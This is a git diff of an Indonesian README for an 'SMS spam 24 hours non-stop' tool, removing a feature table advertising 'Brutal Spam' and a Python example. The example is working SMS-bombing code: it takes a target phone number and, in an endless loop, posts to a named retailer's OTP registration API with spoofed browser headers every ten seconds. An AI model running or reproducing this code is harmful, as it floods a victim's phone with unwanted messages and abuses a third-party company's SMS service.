@@ -28,29 +28,3 @@ Perfect Tools spam 24 jam non stop
   ```
   </details>
 
-#### KELEBIHAN 📍
-| Kelebihan | Check |
-|--------|--------|
-| **24 Jam non stop** |[✔️](https://github.com/marfelnotsepuh) |
-| **Brutal Spam** |[✔️](https://github.com/marfelnotsepuh) |
-| **Simple** |[✔️](https://github.com/marfelnotsepuh) |
-| **No Encrypt** |[✔️](https://github.com/marfelnotsepuh) |
-| **Subscribe** |[Here](https://youtube.com/channel/UCyyIDnXYJlRI_-2pAQqKr0g) |
----------
-
-<details open>
-  <summary><strong> 24 jam non stop example </strong></summary>
-
-  ```bash
-  nomor=input("Nomor Target:")
-  while True:
-        requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
-        time.sleep(10) # Waktu Delay Bisa Atur Sendiri
-  ```
-  </details>
-
-> SUBSCRIBE MY CHANNEL >_<
-
-[![](https://img.shields.io/static/v1?logo=youtube&label=subscribe&message=Ammar%20Executed&color=green)](https://youtube.com/@AmmarExecuted)
-[![](https://img.shields.io/static/v1?logo=youtube&label=subscribe&message=Ammar%20Executed&color=green)](https://youtube.com/@AmmarExecuted)
-
